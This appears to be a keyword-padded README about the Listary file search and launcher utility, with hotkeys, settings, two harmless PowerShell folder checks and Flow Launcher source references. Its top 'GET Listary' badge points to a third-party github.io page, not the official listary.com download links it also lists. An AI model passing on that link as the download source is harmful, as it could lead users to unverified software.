# Listary File Search and Application Launcher

Listary Portable is a useful search term when choosing a Windows search utility that can travel with your files.
Listary combines desktop file discovery, application launching, and folder navigation in file dialogs.
This guide explains Listary File Search, the listary application launcher workflow, and listary quick switch.

[![GET Listary](https://img.shields.io/badge/GET-Listary-7C3AED?style=for-the-badge&labelColor=312E81)](https://listary-portable.github.io/Listary/)

> Version matters: the official portable download is Listary 5. Current desktop releases and their documentation describe a different feature set.

## Official Channels

- [Product website](https://www.listary.com/)
- [Downloads and version choices](https://www.listary.com/download)
- [Official help center](https://help.listary.com/)
- [Pro feature comparison](https://www.listary.com/pro)

All relative source links in this guide point to the supplied Flow Launcher reference code.
That project is a separate application; its implementation files illustrate related design ideas and are not Listary source code.

## Features

| Workflow | What Listary provides | What to check |
| --- | --- | --- |
| Launch an application | A search bar opened with a keyboard shortcut | Whether the expected application appears |
| Locate a document | File results and a larger search window | Filename, parent folder, and index scope |
| Work in File Explorer | Search initiated while browsing folders | Compatibility with the selected file manager |
| Save to a working folder | Quick Switch inside supported file dialogs | Which folder is suggested before saving |
| Search shared storage | Additional indexed network locations | Pro entitlement and access permissions |
| Use a portable copy | An official Listary 5 portable package | Manual folder indexing and older-version behavior |

### Applications & Files

Use the compact launcher for opening a known item and the larger File Search Window for comparing several matches.
A filename can be ambiguous, so inspect its parent directory before opening it.

- Begin with a distinctive part of the name.
- Add folder context when several documents share the same title.
- Check the index scope when a known item is missing.
- Separate application matching from broad file-index searches.

The Listary 6 documentation limits fuzzy matching to applications and recently opened files.
Do not assume that every indexed filename supports the same abbreviated query behavior.

Flow Launcher reference: [StringMatcher.cs](Flow.Launcher.Infrastructure/StringMatcher.cs) implements its own matching logic.
Its [QueryBuilder.cs](Flow.Launcher.Core/Plugin/QueryBuilder.cs) prepares query terms.
The accompanying [Query.cs](Flow.Launcher.Plugin/Query.cs) models plugin input, while [Result.cs](Flow.Launcher.Plugin/Result.cs) models returned items.

![Listary search results showing distinct parent folders for similarly named documents](Scripts/pp1.png)

### Explorer

Typing in Windows File Explorer can invoke Listary search without opening a separate browsing workflow.
Keep the destination folder visible when you are about to use it in another application.

PowerShell example: list PDF filenames in your Documents folder independently of Listary.
This checks the folder directly; it does not query or rebuild the Listary index.

```powershell
$documents = [Environment]::GetFolderPath('MyDocuments')
Get-ChildItem -LiteralPath $documents -Filter '*.pdf' -File |
    Select-Object Name, DirectoryName
```

The example lists the immediate directory only, which makes its search scope easy to compare.
See the [Get-ChildItem reference](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem) for recursive options.

Flow Launcher reference: [FileExplorerHelper.cs](Flow.Launcher.Infrastructure/FileExplorerHelper.cs) obtains the active Explorer path.

### Dialog Jump

Quick Switch connects your current folder context with a supported Open or Save dialog.
Search for a folder, choose a suggestion, or return to a favorite or history location.

A practical workflow:

1. Open the destination folder in File Explorer.
2. Return to the application that is opening or saving a document.
3. Use the suggested folder or the configured Quick Switch shortcut.
4. Confirm the displayed destination before completing the dialog.

Flow Launcher reference: [DialogJump.cs](Flow.Launcher.Infrastructure/DialogJump/DialogJump.cs) coordinates its separate dialog navigation feature.
The [IDialogJump.cs](Flow.Launcher.Plugin/Interfaces/IDialogJump.cs) interface describes a related extension contract in that project.

![Listary Quick Switch suggesting a working folder beneath a Windows save dialog](Scripts/pp1.jpeg)

## Hotkeys

These shortcuts are documented for Listary 6; check the options for the version you actually use.

| Shortcut | Context | Purpose |
| --- | --- | --- |
| Press Ctrl twice | Desktop launcher | Show the search bar |
| Ctrl + G | Quick Switch | Jump to a suggested folder |
| Enter | Selected search result | Open the item |
| Ctrl + Enter | Selected search result | Open the containing folder |
| Alt + P | Search results | Preview the selected item |
| Ctrl + O | Search results | Open available actions |

Change conflicting shortcuts in Listary options rather than relying on another launcher's defaults.
Flow Launcher reference: [GlobalHotkey.cs](Flow.Launcher.Infrastructure/Hotkey/GlobalHotkey.cs) handles global keyboard input in that application.

## Settings

Start with the folders you actually search and expand the scope when a missing location has a clear purpose.
Shared locations also depend on Windows access rights and availability.

- Review which local disks are indexed.
- Exclude folders that generate irrelevant results.
- Confirm access to a shared folder before adding it.
- Check Pro requirements for additional folders and network indexing.

PowerShell example: test a folder you enter at the prompt before troubleshooting search coverage.
This uses Windows filesystem access and does not change Listary settings.

```powershell
$folderToCheck = Read-Host 'Enter the full folder path to check'
$folderExists = Test-Path -LiteralPath $folderToCheck -PathType Container
[pscustomobject]@{ Folder = $folderToCheck; AccessibleFolder = $folderExists }
```

A positive result confirms that the folder is visible to this PowerShell session, not that Listary has indexed it.
The [Test-Path reference](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-path) explains the container check.

Flow Launcher reference: [Settings.cs](Flow.Launcher.Infrastructure/UserSettings/Settings.cs) contains that application's settings model.

### Portable

The official Listary 5 Portable package runs without installation and requires folders to be added and indexed manually.
Check the version label before applying instructions written for Listary 6 or Listary 7.
Do not infer portable support for a current release from the availability of the older package.

Before moving a portable copy between computers:

- Confirm that the required folders still exist on the destination computer.
- Review drive letters and shared-folder availability.
- Test one known file from each important location.

Flow Launcher reference: [Portable.cs](Flow.Launcher.Core/Configuration/Portable.cs) handles its own portable mode.
Its [DataLocation.cs](Flow.Launcher.Infrastructure/UserSettings/DataLocation.cs) selects its own data directory.
Those files do not define where Listary stores settings.

## Plugins

Listary publishes interfaces for file application plugins, including integration with file managers and applications that have their own dialogs.
Use the [official interface repository](https://github.com/listary/Listary.FileAppPlugin) when evaluating Listary integration work.

Check the target application, supported Listary version, and plugin instructions before expecting an integration to work.
Availability of a plugin interface does not establish compatibility with every third-party application.

Flow Launcher reference: [PluginManager.cs](Flow.Launcher.Core/Plugin/PluginManager.cs) manages its separate plugin lifecycle.
The [IPlugin.cs](Flow.Launcher.Plugin/Interfaces/IPlugin.cs) contract belongs to Flow Launcher and cannot be used as a Listary API.

### Customizations

Choose a readable interface and keep shortcuts consistent with the applications you use most often.
Check the current Pro comparison before expecting dark themes, custom filters, or custom actions in the free edition.

Flow Launcher reference: [ThemeHelper.cs](Flow.Launcher.Core/Resource/ThemeHelper.cs) manipulates styles for that application's interface.

### Languages

Use documentation and interface labels that match your installed release when following a workflow.
Localized labels may differ from the English names used in this guide.

Flow Launcher reference: [Internationalization.cs](Flow.Launcher.Core/Resource/Internationalization.cs) manages its language resources.

## Debugging

For a missing result, record the filename, parent folder, application version, and whether Windows can access the location.
For a dialog problem, also record the host application's name and the exact Open or Save window involved.

Flow Launcher reference: [Log.cs](Flow.Launcher.Infrastructure/Logger/Log.cs) configures logging for the supplied comparison project.
Use Listary's own support instructions when collecting diagnostics for Listary.

## Documentation

Consult the [file search guide](https://help.listary.com/search-file) for matching and index scope.
The [Quick Switch guide](https://help.listary.com/quick-switch) explains supported folder navigation workflows.
Consult the download page when comparing the portable package, stable desktop build, and beta releases.

## Related Search Terms

Listary Portable, Listary, Listary File Search, listary application launcher, listary quick switch, listary, application-launcher, keyboard-launcher, launcher, search, windows, portable, productivity, productivity-tools, plugins
